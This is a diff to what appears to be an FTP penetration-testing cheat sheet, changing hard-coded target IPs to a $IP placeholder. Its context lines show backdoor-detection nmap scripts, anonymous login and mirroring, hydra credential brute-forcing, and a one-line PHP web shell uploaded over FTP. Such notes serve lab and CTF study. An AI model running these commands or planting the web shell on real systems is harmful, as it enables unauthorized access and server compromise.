@@ -8,7 +8,7 @@
 ## Enumeration
 
 ```bash
-nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-proftpd-backdoor,ftp-vsftpd-backdoor 10.10.10.10
+nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-proftpd-backdoor,ftp-vsftpd-backdoor $IP
 ```
 
 ---
@@ -24,7 +24,7 @@ ftp user@IP
 ## Anonymous Login
 
 ```bash
-ftp anonymous@10.10.10.10
+ftp anonymous@$IP
 # Password: anonymous OR anon
 
 ftp> ls -la
@@ -33,7 +33,7 @@ ftp> ls -laR       # recursive listing
 
 Mirror the entire directory without interacting manually:
 ```bash
-wget -m --no-passive ftp://anonymous@10.10.10.10
+wget -m --no-passive ftp://anonymous@$IP
 ```
 
 ---
@@ -41,8 +41,8 @@ wget -m --no-passive ftp://anonymous@10.10.10.10
 ## Brute Force
 
 ```bash
-hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://10.10.10.10
-hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.10
+hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://$IP
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://$IP
 ```
 
 ---
@@ -69,7 +69,7 @@ echo '<?php system($_GET["cmd"]); ?>' > shell.php
 ftp> put shell.php
 ```
 
-Access at: `http://10.10.10.10/shell.php?cmd=id`
+Access at: `http://$IP/shell.php?cmd=id`
 
 !!! warning "Watch out"
     Confirm the upload path is web-accessible before spending time on the shell. Upload a test file first and try to reach it over HTTP.
